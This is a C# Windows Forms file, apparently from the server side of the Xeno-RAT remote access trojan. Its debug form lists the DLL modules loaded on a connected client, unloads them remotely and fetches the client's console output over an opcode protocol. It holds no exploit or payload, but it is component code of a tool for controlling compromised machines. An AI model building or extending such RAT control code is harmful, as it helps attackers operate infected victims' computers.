using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class DebugInfo : Form
    {
        Node client;
        public DebugInfo(Node _client)
        {
            InitializeComponent();
            client = _client;
            AsyncInit();
        }

        /// <summary>
        /// Asynchronously initializes the object by resetting and populating the list view.
        /// </summary>
        /// <remarks>
        /// This method asynchronously resets and populates the list view. It awaits the completion of the <see cref="ResetAndPopulateListView"/> method.
        /// </remarks>
        public async Task AsyncInit() 
        {
            await ResetAndPopulateListView();
        }

        /// <summary>
        /// Asynchronously retrieves the list of DLLs from the client and returns an array of strings containing the DLL names.
        /// </summary>
        /// <returns>An array of strings containing the names of the DLLs retrieved from the client.</returns>
        /// <remarks>
        /// This method sends a byte array with the values 4 and 0 to the client using an asynchronous operation.
        /// It then receives a byte array containing DLL information from the client using an asynchronous operation and converts it to a string using UTF-8 encoding.
        /// The string is then split by newline characters to create an array of strings containing the names of the DLLs, which is returned.
        /// </remarks>
        public async Task<string[]> GetDlls() 
        {
            await client.SendAsync(new byte[] { 4, 0 });
            byte[] dll_info_bytes = await client.ReceiveAsync();
            string dll_info = Encoding.UTF8.GetString(dll_info_bytes);
            return dll_info.Split('\n');
        }

        /// <summary>
        /// Unloads the specified DLL from the client and returns a boolean indicating whether the operation was successful.
        /// </summary>
        /// <param name="dllname">The name of the DLL to be unloaded.</param>
        /// <returns>True if the DLL was successfully unloaded; otherwise, false.</returns>
        /// <remarks>
        /// This method sends a payload to the client containing the command to unload the specified DLL.
        /// Upon receiving a response from the client, it returns a boolean indicating whether the operation was successful.
        /// </remarks>
        public async Task<bool> UnLoadDll(string dllname) 
        {
            byte[] payload = new byte[] { 4, 1 };
            payload = client.sock.Concat(payload, Encoding.UTF8.GetBytes(dllname));
            await client.SendAsync(payload);
            bool worked = (await client.ReceiveAsync())[0] == 1;
            return worked;
        }

        /// <summary>
        /// Asynchronously sends a byte array to the client and receives the console output as a string.
        /// </summary>
        /// <returns>The console output received from the client as a string.</returns>
        /// <remarks>
        /// This method sends a byte array containing the values 4 and 2 to the client using an asynchronous operation.
        /// It then receives the console output from the client as a byte array and converts it to a string using UTF-8 encoding.
        /// The resulting console output is returned as a string.
        /// </remarks>
        public async Task<string> getConsoleOutput() 
        {
            await client.SendAsync(new byte[] { 4, 2 });
            byte[] console_output_bytes = await client.ReceiveAsync();
            string console_output = Encoding.UTF8.GetString(console_output_bytes);
            return console_output;
        }

        /// <summary>
        /// Asynchronously sends a byte array to the client and receives the console output as a byte array, then decodes and returns it as a string.
        /// </summary>
        /// <returns>The console output received from the client as a string.</returns>
        /// <remarks>
        /// This method uses asynchronous operations to send a byte array to the client and receive the console output as a byte array.
        /// The received byte array is then decoded using UTF-8 encoding and returned as a string.
        /// </remarks>
        public async Task<string> GetConsoleOutput() 
        {
            await client.SendAsync(new byte[] { 4, 2 });
            byte[] console_output_bytes = await client.ReceiveAsync();
            return Encoding.UTF8.GetString(console_output_bytes);
        }

        /// <summary>
        /// Clears the items in the ListView and repopulates it with the items obtained from the GetDlls method.
        /// </summary>
        /// <remarks>
        /// This method asynchronously clears the items in the ListView and then iterates through the items obtained from the GetDlls method, adding each item to the ListView.
        /// </remarks>
        /// <exception cref="Exception">Thrown when an error occurs while obtaining the DLLs.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        public async Task ResetAndPopulateListView() 
        {
            listView1.Items.Clear();
            foreach (string i in await GetDlls()) 
            {
                listView1.Items.Add(i);
            }
        }

        /// <summary>
        /// Removes the specified DLL and displays a message indicating success or failure.
        /// </summary>
        /// <param name="dllname">The name of the DLL to be removed.</param>
        /// <exception cref="Exception">Thrown when there is an issue unloading the DLL.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method asynchronously unloads the specified DLL using the <see cref="UnLoadDll"/> method.
        /// If the DLL is successfully unloaded, a message box displaying "dll unloaded" is shown.
        /// If there is an issue unloading the DLL, a message box displaying "there was an issue unloading the dll" is shown.
        /// After the operation, the method asynchronously resets and populates the list view using the <see cref="ResetAndPopulateListView"/> method.
        /// </remarks>
        public async Task RemoveClick(string dllname) 
        {
            if (await UnLoadDll(dllname))
            {
                await Task.Run(() => MessageBox.Show("dll unloaded"));
            }
            else 
            {
                await Task.Run(() => MessageBox.Show("there was an issue unloading the dll"));
            }
            await ResetAndPopulateListView();
        }

        /// <summary>
        /// Populates the console output in the RichTextBox control asynchronously.
        /// </summary>
        /// <remarks>
        /// This method asynchronously retrieves the console output and sets it as the text of the RichTextBox control.
        /// </remarks>
        /// <returns>An asynchronous task representing the operation.</returns>
        public async Task PopulateConsoleOutput() 
        {
            string console_output = await getConsoleOutput();
            richTextBox1.Text = console_output;
        }

        /// <summary>
        /// Resets and populates the list view asynchronously.
        /// </summary>
        /// <remarks>
        /// This method resets the list view and populates it with new data asynchronously.
        /// </remarks>
        private async void button1_Click(object sender, EventArgs e)
        {
            await ResetAndPopulateListView();
        }

        /// <summary>
        /// Handles the mouse click event on the listView1 control.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">A MouseEventArgs that contains the event data.</param>
        /// <remarks>
        /// If there are no selected items in the listView1, the method returns without performing any action.
        /// Otherwise, it creates a ContextMenuStrip and a ToolStripMenuItem with the text "Unload".
        /// When the "Unload" menu item is clicked, it triggers the RemoveClick method asynchronously, passing the text of the first selected item in the listView1 as a parameter.
        /// The ContextMenuStrip is then displayed at the current cursor position.
        /// </remarks>
        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (listView1.SelectedItems.Count == 0) return;
            ContextMenuStrip contextMenu = new ContextMenuStrip();
            ToolStripMenuItem menuItem = new ToolStripMenuItem("Unload");
            menuItem.Click += new EventHandler(async (_, __) => await RemoveClick(listView1.SelectedItems[0].Text));
            contextMenu.Items.Add(menuItem);
            contextMenu.Show(Cursor.Position);
        }

        /// <summary>
        /// Occurs when an item is activated within the ListView.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        /// <remarks>
        /// This event occurs when an item is activated within the ListView, typically by double-clicking the item or pressing the Enter key.
        /// </remarks>
        private void listView1_ItemActivate(object sender, EventArgs e)
        {
            
        }

        /// <summary>
        /// Populates the console output asynchronously.
        /// </summary>
        /// <remarks>
        /// This method asynchronously populates the console output by awaiting the result of the <see cref="PopulateConsoleOutput"/> method.
        /// </remarks>
        private async void button2_Click(object sender, EventArgs e)
        {
            await PopulateConsoleOutput();
        }
    }
}
